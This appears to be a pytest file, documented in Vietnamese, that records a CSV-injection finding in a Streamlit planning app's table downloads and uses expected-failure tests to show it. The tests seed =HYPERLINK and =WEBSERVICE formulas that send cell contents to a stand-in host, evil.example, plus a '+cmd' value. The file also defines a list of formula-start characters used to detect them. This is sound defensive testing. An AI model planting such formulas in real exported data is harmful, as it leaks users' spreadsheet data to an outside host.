"""Lá Chắn T-101 (rút gọn): trang Kế hoạch, Cài đặt → Google, trang Bài viết.

Lỗi tìm ra (``xfail(strict=True)``; sửa xong thì gỡ dấu):

- **LC-T101-1** (Thấp): mỗi bảng ``st.dataframe`` (danh sách bài, đề xuất, xung đột, «Xem đủ một
  đề xuất») có nút «Tải về CSV» trên thanh công cụ của Streamlit. Streamlit 1.65 chỉ bọc ngoặc
  kép ô có dấu phẩy, ngoặc kép, xuống dòng (hàm ``O_`` trong
  ``streamlit/static/static/js/DataFrame.*.js``), **không** trung hòa ô mở đầu bằng ``=``, ``+``,
  ``-``, ``@``, tab, CR. Chữ từ Google Sheet, file, chữ dán, AI (``PlanRow`` giữ nguyên chữ dạng
  công thức: đúng thiết kế, đó là chữ) hiện nguyên trong bảng, nên tải về mở bằng Excel thì
  ``=HYPERLINK(…)``, ``=WEBSERVICE(…)`` thành công thức (CSV injection): đúng điều LC-T094-28 chặn
  khi ghi Sheet (``sync.safe_text``). Cách sửa gợi ý: chữ đưa vào ``st.dataframe`` qua
  ``sync.safe_text`` (thêm một dấu cách đầu, như khi ghi Sheet).

Không gọi Google, WordPress, AI thật: dùng lại bộ giả của ``tests/test_t101_plan_page.py``.
"""

from __future__ import annotations

import pytest
import test_t101_plan_page as plan_page
from fake_plan_sheet import HEADER

env = plan_page.env
caches = plan_page.caches
private_key = plan_page.private_key
google = plan_page.google
sheet = plan_page.sheet
open_plan = plan_page.open_plan
paste = plan_page.paste
frame = plan_page.frame

FORMULA_START = ("=", "+", "-", "@", "\t", "\r")
SHEET_FORMULA = '=HYPERLINK("https://evil.example/?q="&A2;"Bấm") cửa sắt'
TITLE_FORMULA = '=WEBSERVICE("https://evil.example/?q="&B3) tiêu đề'
PASTED_FORMULA = "+cmd cửa kéo đài loan"


def formula_cells(table) -> list[str]:
    """Các ô chữ của bảng mở đầu bằng ký tự Excel coi là công thức."""
    return [
        value
        for column in table.columns
        for value in table[column]
        if isinstance(value, str) and value.startswith(FORMULA_START)
    ]


@pytest.mark.xfail(
    strict=True, reason="LC-T101-1: ô bảng dạng công thức tải về CSV mở bằng Excel thành công thức"
)
def test_lc_t101_1_plan_list_cells_cannot_become_excel_formulas(project_root, sheet):
    sheet.set(2, HEADER.index("Từ khóa chính"), SHEET_FORMULA)
    sheet.set(2, HEADER.index("Tiêu đề dự kiến"), TITLE_FORMULA)
    at = open_plan(project_root)
    table = frame(at, "Mã bài")
    assert len(table) == 3
    assert formula_cells(table) == []


@pytest.mark.xfail(
    strict=True, reason="LC-T101-1: ô bảng dạng công thức tải về CSV mở bằng Excel thành công thức"
)
def test_lc_t101_1_proposal_cells_cannot_become_excel_formulas(project_root, sheet):
    at = open_plan(project_root)
    paste(at, f"Từ khóa chính\tTiêu đề dự kiến\n{PASTED_FORMULA}\t{TITLE_FORMULA}\n")
    table = frame(at, "Loại")
    assert len(table) == 1
    assert formula_cells(table) == []
    detail = frame(at, "Hiện tại")
    assert formula_cells(detail) == []
